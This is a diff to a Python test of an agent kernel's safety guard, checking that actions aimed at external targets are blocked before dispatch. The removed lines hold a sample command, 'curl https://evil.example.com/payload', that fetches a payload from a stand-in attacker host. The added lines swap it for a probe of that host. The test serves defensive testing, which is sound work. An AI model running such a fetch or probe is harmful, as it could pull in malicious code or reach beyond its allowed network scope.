@@ -309,10 +309,21 @@ class TestSafetyGuardBlocksExternalTarget:
     def test_safety_guard_blocks_external_target(self) -> None:
         """An action blocked by LocalOnlySafetyGuard is recorded as safety block, not dispatched."""
         envmap = _make_envmap()
+        envmap = EnvMap(
+            **{
+                **envmap.__dict__,
+                "network_scope": "loopback_only",
+                "capabilities": {
+                    **dict(envmap.capabilities),
+                    "service_probe": CapabilityDescriptor(
+                        "service_probe", "probe services", tool_names=("probe_service",),
+                    ),
+                },
+            }
+        )
         executor = MemoryExecutor(workspace_root="/app")
 
-        # The safety guard triggers when refusal_policy has allowed_local_categories
-        # AND forbid_external_targets is True, and the action contains an external URL.
+        # A structured external target is rejected before dispatch in isolated scope.
         ir = _make_ir(
             refusal_policy=RefusalPolicy(
                 allowed_local_categories=("code_generation",),
@@ -320,16 +331,17 @@ class TestSafetyGuardBlocksExternalTarget:
             ),
         )
         external_action = _action(
-            "run_command",
-            {"command": "curl https://evil.example.com/payload"},
+            "probe_service",
+            {"target": "evil.example.com:443"},
             action_id="a-external-1",
+            capability_id="service_probe",
         )
         hooks = FakeHooks(ir, [_act_turn(external_action), _submit_turn()])
         kernel = AetherNextKernel(max_steps=5)
         result = kernel.run(envmap, executor, hooks)
 
         # The command should NOT have been dispatched.
-        assert "curl https://evil.example.com/payload" not in executor.command_history
+        assert executor.command_history == []
 
 
 class TestIntegrityGuardBlocksProtectedPathWrite:
